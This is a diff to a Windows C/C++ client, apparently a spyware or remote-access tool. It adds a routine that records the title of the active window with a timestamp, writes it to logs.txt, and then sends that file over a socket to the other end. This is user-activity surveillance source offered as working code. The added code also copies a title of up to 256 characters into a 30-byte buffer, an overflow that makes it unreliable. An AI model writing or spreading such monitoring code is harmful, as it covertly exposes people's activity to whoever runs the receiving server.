@@ -4,10 +4,37 @@
 #include <stdlib.h>
 #include <Windows.h>
 #include <cstring>
+#include <time.h>
+
+void makeLogs(){
+    char windowTitle[256];
+    FILE *f;
+    f = fopen("logs.txt","w");
+    if(f==NULL){
+        printf("\n\tClient: Error making logs");
+        return;   
+    }
+    // get handle of currently active window
+    HWND handleWindow=GetForegroundWindow();
+    GetWindowText(handleWindow,windowTitle,sizeof(windowTitle));
+    time_t rawtime;
+    struct tm* timeinfo;
+    time (&rawtime);
+    timeinfo = localtime(&rawtime);
+    char p[30];
+    strcpy(p,asctime(timeinfo));
+    // cut off potential tailing \n
+    p[strcspn(p, "\n")] = '\0';
+    strcat(p," : ");
+    strcat(p,windowTitle);
+    fprintf(f, "%s",p);
+    fclose(f);
+}
 
 void sendLog(SOCKET new_socket){
+    makeLogs();
     FILE * fp;
-    fp = fopen("test.txt","rb");
+    fp = fopen("logs.txt","rb");
     if(fp==NULL){
         printf("\n\tClient: File open error");
         return;   
